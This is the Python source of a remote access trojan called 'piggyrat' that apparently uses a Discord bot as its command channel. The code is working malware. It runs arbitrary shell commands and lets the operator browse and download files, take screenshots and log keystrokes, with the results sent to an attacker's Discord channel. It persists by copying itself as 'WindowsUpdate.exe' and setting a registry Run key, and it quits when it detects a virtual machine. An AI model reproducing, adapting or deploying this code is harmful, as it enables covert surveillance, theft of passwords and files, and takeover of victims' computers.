import discord
import subprocess
import os
import platform
import getpass
import socket
import pyautogui
import shutil
import sys
import threading
from discord.ext import commands

TOKEN = "YOUR_DISCORD_BOT_TOKEN"
CHANNEL_ID = 11111111111111 #<---- CHANGE THIS TO YOUR CHANNEL_ID WHERE YOU WILL SEND THE INFO

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

current_dir = os.getcwd()

# ================== HELP ==================
@bot.command()
async def help(ctx):
    embed = discord.Embed(title="piggyrat Help", description="Made by pogmice", color=0x7289da)
    embed.add_field(name="!help", value="Show this menu", inline=False)
    embed.add_field(name="!cd <path>", value="Change directory", inline=False)
    embed.add_field(name="!pwd", value="Show current path", inline=False)
    embed.add_field(name="!ls or !dir", value="Simple list", inline=False)
    embed.add_field(name="!browse", value="Detailed directory view", inline=False)
    embed.add_field(name="!download <file>", value="Download file", inline=False)
    embed.add_field(name="!screenshot", value="Take screenshot", inline=False)
    embed.add_field(name="!cmd <command>", value="Run raw command", inline=False)
    await ctx.send(embed=embed)

# ================== ON READY ==================
@bot.event
async def on_ready():
    print(f"[+] piggyrat connected as {bot.user} - pogmice")
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        embed = discord.Embed(title="piggyrat Online", color=0x00ff00)
        embed.add_field(name="User", value=getpass.getuser(), inline=True)
        embed.add_field(name="Host", value=socket.gethostname(), inline=True)
        await channel.send(embed=embed)

# ================== FILE BROWSER ==================
@bot.command()
async def cd(ctx, *, path=None):
    global current_dir
    if not path:
        await ctx.send("Usage: `!cd <path>`")
        return
    try:
        new_path = os.path.abspath(os.path.join(current_dir, path))
        if os.path.exists(new_path) and os.path.isdir(new_path):
            current_dir = new_path
            embed = discord.Embed(title="Directory Changed", description=current_dir, color=0x00ff00)
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Path not found.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def pwd(ctx):
    embed = discord.Embed(title="Current Directory", description=current_dir, color=0x7289da)
    await ctx.send(embed=embed)

@bot.command(aliases=['ls', 'dir'])
async def listdir(ctx):
    try:
        items = os.listdir(current_dir)
        embed = discord.Embed(title="Directory Listing", description=current_dir, color=0x7289da)
        folders = [f for f in items if os.path.isdir(os.path.join(current_dir, f))]
        files = [f for f in items if os.path.isfile(os.path.join(current_dir, f))]
        
        if folders:
            embed.add_field(name="Folders", value="\n".join(f"📁 {f}" for f in folders[:15]) or "None", inline=False)
        if files:
            embed.add_field(name="Files", value="\n".join(f"📄 {f}" for f in files[:15]) or "None", inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def browse(ctx):
    try:
        items = os.listdir(current_dir)
        embed = discord.Embed(title="📂 Directory Browse", description=current_dir, color=0x7289da)
        
        folders = []
        files = []
        
        for item in sorted(items):
            full_path = os.path.join(current_dir, item)
            try:
                size = os.path.getsize(full_path) if os.path.isfile(full_path) else 0
                if os.path.isdir(full_path):
                    folders.append(f"📁 {item}")
                else:
                    size_str = f" ({size//1024} KB)" if size > 1024 else f" ({size} B)"
                    files.append(f"📄 {item}{size_str}")
            except:
                pass

        if folders:
            embed.add_field(name="Folders", value="\n".join(folders[:20]), inline=False)
        if files:
            embed.add_field(name="Files", value="\n".join(files[:25]), inline=False)
        
        if not folders and not files:
            embed.description = current_dir + "\n(Empty directory)"
            
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def download(ctx, *, filename):
    filepath = os.path.join(current_dir, filename)
    try:
        if os.path.exists(filepath) and os.path.isfile(filepath):
            embed = discord.Embed(title="Downloading File", description=filename, color=0x00ff00)
            await ctx.send(embed=embed)
            await ctx.send(file=discord.File(filepath))
        else:
            await ctx.send("❌ File not found in current directory.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ================== OTHER COMMANDS ==================
@bot.command()
async def screenshot(ctx):
    try:
        img = pyautogui.screenshot()
        img.save("screen.png")
        embed = discord.Embed(title="Screenshot Captured", color=0x00ff00)
        await ctx.send(embed=embed)
        await ctx.send(file=discord.File("screen.png"))
        os.remove("screen.png")
    except Exception as e:
        await ctx.send(f"Screenshot failed: {e}")

@bot.command()
async def cmd(ctx, *, command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=20, cwd=current_dir)
        result = output.decode(errors='ignore')[:1900]
        embed = discord.Embed(title="Command Output", color=0x7289da)
        embed.add_field(name="Command", value=f"`{command}`", inline=False)
        embed.add_field(name="Result", value=f"```{result}```" if result.strip() else "No output", inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Error: {e}")

# ================== BACKGROUND MODULES ==================
def keylogger():
    try:
        from pynput import keyboard
        log = ""
        def on_press(key):
            nonlocal log
            try:
                log += str(key).replace("'", "") + " "
                if len(log) > 250:
                    channel = bot.get_channel(CHANNEL_ID)
                    if channel:
                        bot.loop.create_task(channel.send(f"**Keys:** {log}"))
                    log = ""
            except:
                pass
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except:
        pass

def add_persistence():
    if os.name == "nt":
        try:
            appdata = os.getenv('APPDATA')
            dest = os.path.join(appdata, "Microsoft", "WindowsUpdate.exe")
            src = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            if not os.path.exists(dest):
                shutil.copy(src, dest)
                os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "{dest}" /f')
                print("[+] Persistence added")
        except:
            pass

# ================== MAIN ==================
if __name__ == "__main__":
    print("[*] Starting piggyrat... (pogmice)")

    if any(x in platform.machine().lower() for x in ['vm', 'virtual', 'vbox', 'xen']):
        print("[-] VM detected, exiting")
        sys.exit()

    add_persistence()
    threading.Thread(target=keylogger, daemon=True).start()

    print("[*] Connecting to Discord...")
    bot.run(TOKEN)